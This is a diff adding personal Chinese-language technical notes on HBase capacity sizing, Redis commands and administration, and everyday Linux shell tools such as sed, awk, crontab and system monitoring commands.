+    假设：计算为：10G / 128M * 3 * 0.4 * 2 = 192，意思是说RegionServer上1bytes的Java内存大小需要搭配192bytes的硬盘大小最合理，
+    再回到之前给出的问题，128G的内存总大小，拿出96G作为Java内存用于RegionServer，那对应需要搭配96G ＊ 192 = 18T硬盘容量，若超过18T硬盘容量，则会造成硬盘资源浪费。
+
+
+-----------------------------------Hbase End-----------------------------------------
+
+-----------------------------------Redis Begin-----------------------------------------
+
+1. 资料：http://blog.nosqlfan.com/html/3537.html
+
+2. Redis 基本常见类型：http://www.cnblogs.com/manuosex/archive/2012/09/18/2691190.html
+
+3. 连接操作相关的命令 http://www.cnblogs.com/oubo/archive/2011/09/07/2394568.html
+
+    quit：关闭连接（connection）
+    auth：简单密码认证
+
+    持久化
+      save：将数据同步保存到磁盘
+      bgsave：将数据异步保存到磁盘
+      lastsave：返回上次成功将数据保存到磁盘的Unix时戳
+      shundown：将数据同步保存到磁盘，然后关闭服务
+
+    远程服务控制
+      info：提供服务器的信息和统计
+        - info commandstats: 查看所有命令统计的快照，比如命令执行了多少次，已经所耗费的毫秒数
+          通过config resetstat命令重置统计数据
+      monitor：实时转储收到的请求
+      slaveof：改变复制策略设置
+        - slaveof 127.0.0.1 6379
+        - slaveof no one
+      config：在运行时配置Redis服务器
+
+    管理工具
+    1) 耗时命令日志
+      slowlog get
+      每条日志包括4个部分：
+      - 该日志唯一ID；
+      - 该命令执行的UNIX时间；
+      - 该命令的耗时时间，单位是微秒
+      - 命令及其参数。
+      涉及的相关配置：
+      - slowlog-log-slower-than (单位是微秒)
+      - slowlog-max-len
+    2) 监控命令: 监控Redis执行的所有命令
+      monitor
+      monitort命令非常影响Redis的性能，一个客户端使用monitor命令会降低Redis将近一半的负载能力。
+      因此monitor命令只适合用来调试和纠错。
+    3) phpRedisAdmin
+      以树形结构查看键列表，编辑键值，导入/导出数据库数据，查看数据库信息和查看键信息等功能
+    4) Rdbtools
+      一个Redis的快照文件解析器，可以根据快照文件导出JSON数据文件、分析Redis中每个键的占用空间情况等。
+
+    对value操作的命令
+      exists(key)：确认一个key是否存在
+      del(key)：删除一个key
+        批量删除：redis-cli DEL 'redis-cli KEYS "user:*"'
+      type(key)：返回值的类型
+      keys(pattern)：返回满足给定pattern的所有key
+      randomkey：随机返回key空间的一个
+      keyrename(oldname, newname)：重命名key
+      dbsize：返回当前数据库中key的数目
+      expire：设定一个key的活动时间（s）
+      pexpire: 设定一个key的活动时间（ms）
+      persist: 取消一个key的生存时间设置(即将键恢复成永久的)
+        注意：Redis在三种情况下会回收过期的key-value
+        - 有专门的定期回收过期的key-value
+        - 是被调用时发现是过期的，则被回收
+        - 当内存大小大于设定值时，会优先回收过期的数据
+      ttl：获得一个key的活动时间(s)
+      pttl: 获得一个key的活动时间(ms)
+      select(index)：按索引查询
+      move(key, dbindex)：移动当前数据库中的key到dbindex数据库
+      flushdb：删除当前选择数据库中的所有key
+      flushall：删除所有数据库中的所有key
+      sort key [alpha|desc]: 对列表类型、集合类型和有序集合类型键进行排序，并且可以完成与关系型数据库中的连接查询相类似的任务
+
+    对String操作的命令
+      set(key, value)：给数据库中名称为key的string赋予值value
+      get(key)：返回数据库中名称为key的string的value
+      getset(key, value)：给名称为key的string赋予上一次的value
+      mget(key1, key2,…, key N)：返回库中多个string的value
+      setnx(key, value)：添加string，名称为key，值为value
+      setex(key, time, value)：向库中添加string，设定过期时间time
+      mset(key N, value N)：批量设置多个string的值
+      msetnx(key N, value N)：如果所有名称为key i的string都不存在
+      incr(key)：名称为key的string增1操作
+      incrby(key, integer)：名称为key的string增加integer
+      decr(key)：名称为key的string减1操作
+      decrby(key, integer)：名称为key的string减少integer
+      append(key, value)：名称为key的string的值附加value
+      substr(key, start, end)：返回名称为key的string的value的子串
+      strlen(key): 返回 key 所储存的字符串值的长度
+
+    对Hash操作的命令
+      hset(key, field, value)：向名称为key的hash中添加元素field
+      hget(key, field)：返回名称为key的hash中field对应的value
+      hmget(key, (fields))：返回名称为key的hash中field i对应的value
+      hmset(key, (fields))：向名称为key的hash中添加元素field 
+      hincrby(key, field, integer)：将名称为key的hash中field的value增加integer
+      hexists(key, field)：名称为key的hash中是否存在键为field的域
+      hdel(key, field)：删除名称为key的hash中键为field的域
+      hlen(key)：返回名称为key的hash中元素个数
+      hkeys(key)：返回名称为key的hash中所有键
+      hvals(key)：返回名称为key的hash中所有键对应的value
+      hgetall(key)：返回名称为key的hash中所有的键（field）及其对应的value
+
+    对List操作的命令
+      rpush(key, value)：在名称为key的list尾添加一个值为value的元素
+      lpush(key, value)：在名称为key的list头添加一个值为value的元素
+      llen(key)：返回名称为key的list的长度
+      lrange(key, start, end)：返回名称为key的list中start至end之间的元素
+      ltrim(key, start, end)：截取名称为key的list
+      lindex(key, index)：返回名称为key的list中index位置的元素
+      lset(key, index, value)：给名称为key的list中index位置的元素赋值
+      lrem(key, count, value)：删除count个key的list中值为value的元素
+      lpop(key)：返回并删除名称为key的list中的首元素
+      rpop(key)：返回并删除名称为key的list中的尾元素
+      blpop(key1, key2,… key N, timeout)：lpop命令的block版本。
+      brpop(key1, key2,… key N, timeout)：rpop的block版本。
+      rpoplpush(srckey, dstkey)：返回并删除名称为srckey的list的尾元素，并将该元素添加到名称为dstkey的list的头部
+
+    对Set操作的命令
+      sadd(key, member)：向名称为key的set中添加元素member
+      srem(key, member) ：删除名称为key的set中的元素member
+      spop(key) ：随机返回并删除名称为key的set中一个元素
+      smove(srckey, dstkey, member) ：移到集合元素
+      scard(key) ：返回名称为key的set的基数
+      sismember(key, member) ：member是否是名称为key的set的元素
+      sinter(key1, key2,…key N) ：求交集
+      sinterstore(dstkey, (keys)) ：求交集并将交集保存到dstkey的集合
+      sunion(key1, (keys)) ：求并集
+      sunionstore(dstkey, (keys)) ：求并集并将并集保存到dstkey的集合
+      sdiff(key1, (keys)) ：求差集
+      sdiffstore(dstkey, (keys)) ：求差集并将差集保存到dstkey的集合
+      smembers(key) ：返回名称为key的set的所有元素
+      srandmember(key) ：随机返回名称为key的set的一个元素
+
+    对sorted set操作的命令
+      zadd(key, score, member): 添加元素到集合，元素在集合中存在则更新对应score
+      zrem(key, member): 删除指定元素
+      zincrby(key, incr, member): 增加对应member的score值，然后移动元素并保持skip list保持有序，返回更新后的score值
+      zrank(key, member): 返回指定元素在集合中的排名(下标)，集合中元素是按score从小到大排序的
+      zrevrank(key, member): 同上，但是集合中元素是按score从大到校排序
+      zrange(key, start, end): 类似lrange操作从集合中取指定区间的元素，返回的是有序结果
+      zrevrange(key, start, end): 同上，返回结果是按score逆序的
+      zrangebyscore(key, min, max): 返回集合中score在给定区间的元素
+      zcount(key, min, max): 返回集合中score在给定区间的数量
+      zcard(key): 返回集合中元素个数
+      zscore(key, element): 返回给定元素对应的score
+
+
+    事务: a)要么都执行，要么都不执行；b)保证了执行顺序
+      multi 事务开始
+      exec 事务执行，执行exec命令后会取消对所有键的监控(watch操作)
+      watch 监控一个或多个键，一旦其中一个键被修改(或删除)，之后的事务就不会执行。
+      unwatch
+    语法错误：在执行前能够被识别，因此所有操作都不会执行
+    运行错误：只有在运行时被识别，而且redis没有回滚操作，因此对的行为操作仍会被执行
+
+    脚本执行
+    eval script numkeys key [key ...] arg [arg ...]
+
+4. 主/从数据库备份设置使用，若主数据库设置了密码，在从数据库需要通过masterauth参数设置主数据库的密码
+   设置监听哪个主数据库：slaveof 主数据库IP 主数据库端口
+   取消监听：slaveof no one
+
+   主数据库：redis_server
+   从数据库：redis_server --port 6380 --slaveof 127.0.0.1 6379
+   可以使用主/从数据库做读写分离(负载均衡)，主数据库主要用作写入操作，而从数据库可以完成读操作
+
+5. 配置文件
+  - rename-command flushall asdfasdfasdflajoajflwjefisjdf  //重命名flushall，以保证只有自己的应用可以使用该命令
+  - rename-command flushall ""  //禁用flushall命令
+
+
+
+-----------------------------------Redis End-----------------------------------------
+
+-----------------------------------Linux Begin-----------------------------------------
+
+1. 管道 |：前一条命令的输出作为后一条命令的输入
+  ls -l | grep 'etc'
+
+2. tail 从指定点开始将文件写到标准输出
+  tail -f xxfile 命令可用于监视另一个进程正在写入的文件的增长
+  -n Number 从Number 变量表示的行位置开始读取指定文件
+
+3. head 用来显示文件的开头至标准输出中
+  -v 显示文件名
+  -n <行数> 显示的行数
+
+4. grep：Global Regular Expression Print，表示全局正则表达式版本，是一个文本搜索工具
+  [options]主要参数：
+    －c：只输出匹配行的计数。
+    －I：不区分大 小写(只适用于单字符)。
+    －h：查询多文件时不显示文件名。
+    －l：查询多文件时只输出包含匹配字符的文件名。
+    －n：显示匹配行及 行号。
+    －s：不显示不存在或无匹配文本的错误信息。
+    －v：显示不包含匹配文本的所有行。
+  pattern正则表达式主要参数：
+    \： 忽略正则表达式中特殊字符的原有含义。
+    ^：匹配正则表达式的开始行。
+    $: 匹配正则表达式的结束行。
+    \<：从匹配正则表达 式的行开始。
+    \>：到匹配正则表达式的行结束。
+    [ ]：单个字符，如[A]即A符合要求 。
+    [ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。
+    . ：所有的单个字符。
+    * ：有字符，长度可以为0。
+
+5. xargs 
+  用途：
+    1.构造参数列表并运行命令，即将接收的参数传递给后面的command 命令执行
+    2.将多行输入转换为单行 （特殊功效）
+  -I 格式：xargs -I rep-str comand rep-srt 
+  rep-str 为代替传递给xargs参数，可以使 {} $ @ 等符号，其主要作用是当xargs command后有多个参数时,调整参数位置。
+  示例：find . -name "*.txt" | xargs -I {} cp {} /tmp
+
+6. find 查找文件的命令
+  find . -iname "*.txt" // .表示当前目录，也可以用/表示根目录，-name "*.txt" 查找.txt后缀的所有文件
+
+7. crontab 用于在Linux中设置定时任务
+  crontab -l  //查看当前用户下的cron任务
+  crontab -e //编辑当前用户的定时任务
+  crontab -u linuxso -e //编辑用户linuxso的定时任务
+  时间格式
+  * * * * * command
+  分 时 日 月 周 命令
+  星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。
+  逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”
+  中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”
+  正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次
+  示例：
+  45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart 表示每月1、10、22日的4:45重启apache
+  
+8. du查看目录大小，df查看磁盘使用情况
+
+9. scp root@zdh234:/home/xxfile /home/
+  -C 压缩传输
+  -P 2222 指定端口号
+  -r 递归复制目录下的文件
+
+10. hdfs dfs -ls /user/cl
+    hdfs dfs -mkdir /user/cl/temp
+    hdfs dfs -du -h /user/cl/temp 查看文件大小
+    hdfs dfs -du -s -h /user/cl/temp  只查看当前目录文件的大小
+    hdfs dfs -rm /user/cl/temp/a.txt
+    hdfs dfs -rmr /user/cl/temp
+    hdfs dfs -put /home/cl/local.txt /user/cl/temp
+    hdfs dfs -get /user/cl/temp/hdfs.txt /home/cl
+    hdfs dfs –cat /home/cl/hdfs.txt
+    hdfs dfs -getmerge /spark/zxvmax.db/xx_table/xx_partition/part-00* ./test.csv
+
+11. 启动流程
+	操作系统 -> /boot -> init进程 -> 运行级别（七个级别） -> /etc/init.d -> 用户登录 -> Login shell
+
+	关机
+	sync > shutdown > reboot > half
+	sync 把数据由内存同步到硬盘中
+	shutdown -r now 立即重启 相当于 reboot
+	shutdown -h now  立即关机 相当于 half 或 poweroff
+	half 用halt命令来关机时，实际调用的是shutdown -h。halt 执行时将杀死应用进程，执行sync系统调用文件系统写操作完成后就会停止内核。
+
+	shutdown 命令需要root权限，实际调用的是 init 的命令
+
+	init 0 ~ 6
+	0: 停机
+	1：单用户形式，只root进行维护
+	2：多用户，不能使用 net file system
+	3：完全多用户
+	4：安全模式
+	5：图形化
+	6：重启
+
+12. 目录处理命令
+	ls: 列出目录
+	cd：切换目录
+	pwd：显示目前的目录
+	mkdir：创建一个新的目录
+	rmdir：删除一个空的目录
+	cp: 复制文件或目录
+	rm: 移除文件或目录
+	mv: 移动文件或目录，可用于重命名
+
+13. 文件内容查看
+	cat  由第一行开始显示文件内容
+	tac  从最后一行开始显示，可以看出 tac 是 cat 的倒著写！
+	nl   显示的时候，顺道输出行号！
+	more 一页一页的显示文件内容
+	less 与 more 类似，但是比 more 更好的是，他可以往前翻页！
+	head 只看头几行
+	tail 只看尾巴几行
+
+14. 磁盘管理
+	df：列出文件系统的整体磁盘使用量
+		-h 以人们较易阅读的 GBytes, MBytes, KBytes 等格式自行显示
+	du：检查磁盘空间使用量
+		-h -s
+	fdisk：用于磁盘分区
+
+	df -h /home
+	查看 /home 目录的磁盘使用情况(使用率)
+
+	du -sh
+	查看当前目录下的空间大小
+	可以用 du -h --max-depth=1 代替
+
+15. 磁盘挂载与卸除
+	把 /dev/hdc6 挂载到 /mnt/hdc6 上：mount /dev/hdc6 /mnt/hdc6 
+	取消上述的挂载：umount /dev/hdc6 
+
+16. expr命令是一个手工命令行计数器，用于在UNIX/LINUX下求表达式变量的值 http://blog.csdn.net/guhong5153/article/details/6542995
+	格式：expr Expression (命令读入Expression 参数,计算它的值,然后将结果写入到标准输出)
+	match String1 String2	与 Expression1 : Expression2 相同。
+	length String1	返回 String1 的长度。
+	index String1 String2	返回 String1 中包含 String2 中任意字符的第一个位置。
+	substr String1 StartPosition Length 返回一个以 StartPosition 的字符开始的在 String1 中的字符串，并且是 Length 长度的字符串。  
+
+17. Shell 基本运算符
+	算数运算符  使用expr命令, 如val=`expr 2 + 2`，注意空格与反引号
+	关系运算符  -eq -ne -gt -lt -ge -le
+	布尔运算符  ! -o -a
+	逻辑运算符  && ||
+	字符串运算符  == != -z -n str
+	文件测试运算符 
+		-b file	检测文件是否是块设备文件，如果是，则返回 true。	[ -b $file ] 返回 false。
+		-c file	检测文件是否是字符设备文件，如果是，则返回 true。	[ -c $file ] 返回 false。
+		-d file	检测文件是否是目录，如果是，则返回 true。	[ -d $file ] 返回 false。
+		-f file	检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。	[ -f $file ] 返回 true。
+		-g file	检测文件是否设置了 SGID 位，如果是，则返回 true。	[ -g $file ] 返回 false。
+		-k file	检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。	[ -k $file ] 返回 false。
+		-p file	检测文件是否是具名管道，如果是，则返回 true。	[ -p $file ] 返回 false。
+		-u file	检测文件是否设置了 SUID 位，如果是，则返回 true。	[ -u $file ] 返回 false。
+		-r file	检测文件是否可读，如果是，则返回 true。	[ -r $file ] 返回 true。
+		-w file	检测文件是否可写，如果是，则返回 true。	[ -w $file ] 返回 true。
+		-x file	检测文件是否可执行，如果是，则返回 true。	[ -x $file ] 返回 true。
+		-s file	检测文件是否为空（文件大小是否大于0），不为空返回 true。	[ -s $file ] 返回 true。
+		-e file	检测文件（包括目录）是否存在，如果是，则返回 true。	[ -e $file ] 返回 true。
+		
+	echo 命令
+	echo -e "OK! \n"  # -e 开启转义
+
+	#!/bin/sh
+	read name  #从标准输入读取一个值并赋给变量name
+	echo "$name It is a test"
+
+	echo "It is a test" > myfile #显示结果定向至文件
+
+	printf 命令需要手动添加 \n 以达到换行的效果
+	printf 命令的语法：printf  format-string  [arguments...]
+	printf "%-10s %-8s %-4.2f\n" 郭芙 女 47.9876
+	%-10s 指一个宽度为10个字符（-表示左对齐，没有则表示右对齐），任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。
+	%-4.2f 指格式化为小数，其中.2指保留2位小数。
+
+	Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。
+	num1=100
+	num2=100
+	if test $[num1] -eq $[num2]
+	then
+	    echo '两个数相等！'
+	else
+	    echo '两个数不相等！'
+	fi
+
+	if [ $(ps -ef | grep -c "ssh") -gt 1 ]; then echo "true"; fi
+
+	无限循环
+		while :
+		do
+			command
+		done
+	或
+		while true
+		do
+			command
+		done
+	或
+		for (( ; ; ))
+		
+	shell中函数的定义格式
+	[ function ] funname [()]
+	{
+	    action;
+	    [return int;]
+	}
+
+	funWithParam(){
+	    echo "第一个参数为 $1 !"
+	    echo "第二个参数为 $2 !"
+	    echo "第十个参数为 $10 !"  #此处只输出 10
+	    echo "第十个参数为 ${10} !" #当取顺序大于10的参数时，需要添加{}号
+	    echo "第十一个参数为 ${11} !"
+	    echo "参数总数有 $# 个!"
+	    echo "作为一个字符串输出所有参数 $* !"
+	}
+	funWithParam 1 2 3 4 5 6 7 8 9 34 73 #函数传参的方式
+
+	标准输入文件(stdin)：stdin的文件描述符为0，Unix程序默认从stdin读取数据。
+	标准输出文件(stdout)：stdout 的文件描述符为1，Unix程序默认向stdout输出数据。
+	标准错误文件(stderr)：stderr的文件描述符为2，Unix程序会向stderr流中写入错误信息
+
+	默认情况下，command > file 将 stdout 重定向到 file，command < file 将stdin 重定向到 file。
+	如果希望 stderr 重定向到 file，可以这样写：command 2 > file
+	如果希望将 stdout 和 stderr 合并后重定向到 file，可以这样写： command > file 2>&1 或者 command >> file 2>&1
+	如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 /dev/null （起到屏蔽输出的作用）：command > /dev/null
+	如果希望屏蔽 stdout 和 stderr，可以这样写：
+	command > /dev/null 2>&1
+
+	shell 中引入其他文件的两种方式：
+		. filename   # 注意点号(.)和文件名中间有一空格
+	或
+		source filename
+		
+	basedir=`cd \`dirname $0\`; pwd`
+	这个命令写在脚本文件里才有作用，其返回这个脚本文件放置的目录，并可以根据这个目录来定位所要运行程序的相对位置（绝对位置除外）。
+	这样就可以知道一些和脚本一起部署的文件的位置了，只要知道相对位置就可以根据这个目录来定位，而可以不用关心绝对位置。
+	这样脚本的可移植性就提高了，扔到任何一台服务器，（如果是部署脚本）都可以执行。
+
+	echo `date +"%Y-%m-%d %H:%M:%S"` begin generate day data :>> $logfile
+	格式化系统当前时间，并组合其他信息以追加的方式重定向到 $logfile 中，:>> 相当于 >>
+
+18. wc -l < import_data.sql #统计 import_data.sql 文件的行数
+
+19. cat file | somecommand  //效率较低
+	somecommand < file  //效率较高
+	< file somecommand  #bash适用，其他shell不知道
+
+20. whoami  # 返回当前用户的用户名
+
+21. sed 工具
+	http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2856901.html
+	http://blog.jobbole.com/31026/
+	sed [-nefr] [动作]
+	-i 对当前的文件进行编辑，而不是对副本操作	sed -i '1i\####' test.file
+	-e 多点编辑，用于把多个指令串接起来，以选项中指定的script来处理输入的文本文件  sed -e 's/ MA/, Massachusetts/' -e 's/ PA/, Pennsylvania/' list
+	-f 直接将 sed 的动作写在一个文件内， -f filename 则可以运行 filename 内的 sed 动作
+	-n 使用安静(silent)模式。在一般 sed 的用法中，所有来自 STDIN 的数据一般都会被列出到终端上。但如果加上 -n 参数后，则只有经过sed 特殊处理的那一行(或者动作)才会被列出来。
+
+  当替换字符中包含/反斜杠字符时，可以使用:代替/做分割
+  如：NEW_STRING="CCC/DDD"
+      sed -i "s:ccc/ddd:${NEW_STRING}:" test-sed.txt
+
+	动作说明： [n1[,n2]]function
+	n1, n2 ：不见得会存在，一般代表『选择进行动作的行数』，举例来说，如果我的动作是需要在 10 到 20 行之间进行的，则『 10,20[动作行为] 』
+	function：
+	a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～
+	c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！
+	d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；
+	i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；
+	p ：列印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～
+	s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！
+	y : 替换命令，如 echo "hello, world" | sed 'y/abcdefghijklmnopqrstuvwxyz/ABCDEFGHIJKLMNOPQRSTUVWXYZ/' ，把小写字母替换为大写字母
+	q : 退出，当sed读取到匹配的行之后即退出，不会再读入新的行，并且将当前模式空间的内容输出到屏幕。
+
+	# 行删除
+	  nl /etc/passwd | sed '3,$d'  // $ 表示最后一行， 将 /etc/passwd 的内容列出并且列印行号，同时删除3至最后一行
+	# 行新增
+    nl /etc/passwd | sed '2a drink tea'  // 第二行之后插入
+    nl /etc/passwd | sed '2i drink tea'  // 第二行之前插入
+    nl /etc/passwd | sed '2a Drink tea or ......\   //一次插入多行，使用反斜杠 \
+    > drink beer ?'
+	# 行替换与显示
+    nl /etc/passwd | sed '2,5c No 2-5 number'  //将第2-5行的内容取代成为『No 2-5 number』
+    nl /etc/passwd | sed -n '5,7p'  //仅列出 /etc/passwd 文件内的第 5-7 行
+	# 数据搜索与显示
+	  nl /etc/passwd | sed -n '/root/p'  // -n 参数表示只显示包含 root 的行
+	# 数据搜索与删除
+	  nl /etc/passwd | sed  '/root/d'  // 删除包含 root 的行
+	# 数据搜索并执行命令
+	  nl /etc/passwd | sed -n '/bash/{s/bash/blueshell/;p;q}'   // 搜索/etc/passwd,找到root对应的行，执行后面花括号中的一组命令，每个命令之间用分号分隔，这里把bash替换为blueshell，再输出这行,然后退出
+	# 数据搜索并替换
+	  sed 's/要被取代的字串/新的字串/g'
+	  /sbin/ifconfig eth0 | grep 'inet addr' | sed 's/^.*addr://g' | sed 's/Bcast.*$//g'      // 只输出IP
+
+	模式空间：是sed内部维护的一个缓存空间，它存放着读入的一行或者多行内容。但是模式空间的一个限制是无法保存模式空间中被处理的行，因此sed又引入了另外一个缓存空间——模式空间（Hold Space）。
+	地址匹配：被script影响的所有行
+	保持空间: 用于保存模式空间的内容，模式空间的内容可以复制到保持空间，同样地保持空间的内容可以复制回模式空间。
+
+	//把每一行的换行符换成自定义的符号
+	function join_lines()
+	{
+		local delim=${1:-,}
+		sed 'H;$!d;${x;s/^n//;s/n/'$delim'/g}'
+	}
+	cat text | join_lines ';'
+	1;11;2;11;22;111;222
+
+	echo "hello, world" | sed 'y/abcdefghijklmnopqrstuvwxyz/ABCDEFGHIJKLMNOPQRSTUVWXYZ/'
+	相当于 echo "hello, world" | tr a-z A-Z
+
+22. awk 工具
+	http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2858470.html
+	awk ''  // 被 awk 解析的代码需要被「单引号」 '' 括起来。
+	-F ERE：定义字段分隔符，该选项的值可以是扩展的正则表达式（ERE）
+	-f progfile：指定awk脚本，可以同时指定多个脚本，它们会按照在命令行中出现的顺序连接在一起
+	-v assignment：定义awk变量，形式同awk中的变量赋值，即name=value，赋值发生在awk处理文本之前
+
+	内置变量
+	ARGC	命令行参数的各个，即ARGV数组的长度
+	ARGV	存放命令行参数
+	CONVFMT	定义awk内部数值转换成字符串的格式，默认值为”%.6g”
+	OFMT	定义输出时数值转换成字符串的格式，默认值为”%.6g”
+	ENVIRON	存放系统环境变量的关联数组
+	FILENAME	当前被处理的文件名
+	NR	记录的总个数
+	FNR	当前文件中的记录的总个数
+	FS	字段分隔符，默认为空白
+	NF	每个记录中字段的个数
+	RS	记录的分隔符，默认为回车
+	OFS	输出时字段的分隔符，默认为空白
+	ORS	输出时记录的分隔符，默认为回车
+	RLENGTH	被match函数匹配的子串长度
+	RSTART	被match函数匹配的子串位于目标字符串的起始下标
+
+	cat /etc/passwd | awk  -F ':'  'BEGIN {print "name,shell"}  {print $1","$7} END {print "blue,/bin/nosh"}'
+	awk工作流程是这样的：先执行BEGING，然后读取文件，读入有/n换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，
+	$0则表示所有域,$1表示第一个域,$n表示第n个域,随后开始执行模式所对应的动作action。接着开始读入第二条记录..., 直到所有的记录都读完，最后执行END操作。
+
+	last -n 5 | awk  '{print $1}'
+	输出第一个域，默认使用 /t 分割，可以用 -F ':' 指定使用 ：分割。
+
+	awk  -F ':'  '{print "filename:" FILENAME ",linenumber:" NR ",columns:" NF ",linecontent:"$0}' /etc/passwd
+	相当于
+	awk  -F ':'  '{printf("filename:%10s,linenumber:%s,columns:%s,linecontent:%s\n",FILENAME,NR,NF,$0)}' /etc/passwd
+
+	awk中同时提供了print和printf两种打印输出的函数。
+	其中print函数的参数可以是变量、数值或者字符串。字符串必须用双引号引用，参数用逗号分隔。如果没有逗号，参数就串联在一起而无法区分。这里，逗号的作用与输出文件的分隔符的作用是一样的，只是后者是空格而已。
+	printf函数，其用法和c语言中printf基本相似,可以格式化字符串,输出复杂时，printf更加好用，代码更易懂。
+
+	统计某个文件夹下的文件占用的字节数
+	ls -l |awk 'BEGIN {size=0;} {size=size+$5;} END {print "[end]size is ", size}'
+	[end]size is  8657198
+	// BEGIN 代码块初始化了 size 变量，BEGIN {size=0;} 在程序运行前执行一次, 常用于初始化变量;
+	// {size=size+$5;} , 程序主体, ls -l 有n行，执行n次；若有多条语句，使用分号 ；分开。
+	// END {print "[end]size is ", size} , 程序结束时运行一次。
+	// BEGIN 和 END 并不是必须的。
+
+	# 条件语句，和C语言的一致
+	统计某个文件夹下的文件占用的字节数,过滤4096大小的文件(一般都是文件夹):
+	ls -l | awk 'BEGIN {size=0;print "[start]size is ", size} {if($5!=4096){size=size+$5;}} END {print "[end]size is ", size/1024/1024,"M"}' 
+	[end]size is  8.22339 M
+
+	# 循环语句
+	awk中的循环语句同样借鉴于C语言，支持while、do/while、for、break、continue，这些关键字的语义和C语言中的语义完全相同。
+
+	# 数组
+	awk -F ':' 'BEGIN {count=0;} {name[count] = $1;count++;}; END {for (i = 0; i < NR; i++) print i, name[i]}' /etc/passwd
+	0 root
+	1 daemon
+	2 bin
+	......
+
+23. 别名设置
+	alias ll='ls -l'
+	unalias ll
+
+24. grep 'model name' /proc/cpuinfo  # 查看cpu信息
+	grep 'MemTotal' /proc/meminfo  # 查看内存信息
+
+25. 系统监控相关命令
+	uptime 
+	11:07:03 up 2 days, 25 min,  3 users,  load average: 0.53, 0.31, 0.25
+
+	dmesg | tail
+	dmesg用来显示内核环缓冲区（kernel-ring buffer）内容，内核将各种消息存放在这里,包括开机信息。
+
+	vmstat 2 1  //2表示每个两秒采集一次服务器状态，1表示只采集一次。
+	procs -----------memory---------- ---swap-- -----io---- -system-- ----cpu----
+	 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa
+	 1  0      0 3498472 315836 3819540    0    0     0     1    2    0  0  0 100  0
+
+	dstat  //全能系统信息统计工具
+	alias dstat='dstat -cdlmnpsy'
+	dstat 比 vmstat 少了对 io 的监控信息
+
+	mpstat  //用于获取每个 CPU 相关统计信息的有用的命令 http://blog.csdn.net/evils798/article/details/7524474
+	mpstat -P ALL 5 2  //统计所有 cpu 的相关信息，每5秒统计一次，共统计2次
+
+	pidstat 2 1  //主要用于监控全部或指定进程占用系统资源的情况
+	-p 21180 //指定进程号
+	-u //cpu
+	-r //内存
+	-d //IO
+
+	iostat 2 1 //查看进程IO请求下发的数量、系统处理IO请求的耗时，进而分析进程与操作系统的交互过程中IO方面是否存在瓶颈。http://www.cnblogs.com/bangerlee/articles/2547161.html
+	-c //查看内存信息
+	-d //查看 device 信息
+	-k //以kB为单位显示读写信息
+	-x //更详细的io统计信息
+
+	free  //显示内存的使用情况，包括实体内存，虚拟的交换文件内存，共享内存区段，以及系统核心使用的缓冲区等。http://www.cnblogs.com/ggjucheng/archive/2012/01/08/2316438.html
+	free -c 4 -s 2  //为KB为单位，每2秒显式系统内存使用情况，一共显示4次
+	-k 　以KB为单位显示内存使用情况。
+	-m 　以MB为单位显示内存使用情况。
+
+	sar （System Activity Reporter系统活动情况报告）是目前 Linux 上最为全面的系统性能分析工具之一，可以从多方面对系统的活动进行报告，包括：文件的读写情况、系统调用的使用情况、磁盘I/O、CPU效率、内存使用状况、进程活动及IPC有关的活动等。
+	-u  CPU资源监控
+	-q  进程队列长度和平均负载状态监控
+	-B  内存分页监控
+	-r  内存和交换空间监控
+	-W  系统交换活动信息监控
+	-b  I/O和传送速率监控
+	-d  设备使用情况监控
+	-n  指定关键词，并对其进行监控，如：sar -n DEV 1 或 sar -n TCP, ETCP 1
+
+	1. 若 %iowait 的值过高，表示硬盘存在I/O瓶颈
+	2. 若 %idle 的值高但系统响应慢时，有可能是 CPU 等待分配内存，此时应加大内存容量
+	3. 若 %idle 的值持续低于1，则系统的 CPU 处理能力相对较低，表明系统中最需要解决的资源是 CPU 
+
+	要判断系统瓶颈问题，有时需几个 sar 命令选项结合起来
+	怀疑CPU存在瓶颈，可用 sar -u 和 sar -q 等来查看
+	怀疑内存存在瓶颈，可用 sar -B、sar -r 和 sar -W 等来查看
+	怀疑I/O存在瓶颈，可用 sar -b、sar -u 和 sar -d 等来查看
+
+
+	ps 为我们提供了进程的一次性的查看，它所提供的查看结果并不动态连续的;
+	如果想对进程时间监控，应该用 top 工具。
+	kill 命令用于杀死进程。
+
+	ps -ef  //显示所有进程信息，连同命令行，
+		常用组合命令：ps -ef | grep ssh  或者 ps -ef | more
+		ps -ef | grep thriftserver | awk '{print $2}' | xargs kill -9   // kill -9 强制杀死thriftserver进程
+	ps -A  //显示所有进程信息
+	ps -u root  //显示root用户下的信息
+	ps -l  //将目前属于您自己这次登入的 PID 与相关信息列示出来
+	ps aux  //列出目前所有的正在内存当中的程序，不一定正在运行
+	ps -axjf  //列出类似程序树的程序显示
+	ps -o pid,ppid,pgrp,session,tpgid,comm  //输出指定的字段
+
+
+	top  //用于实时显示 process 的动态
+
+	top - 18:25:05 up 8 days,  3:31,  1 user,  load average: 0.00, 0.00, 0.00
+	Tasks: 223 total,   1 running, 222 sleeping,   0 stopped,   0 zombie
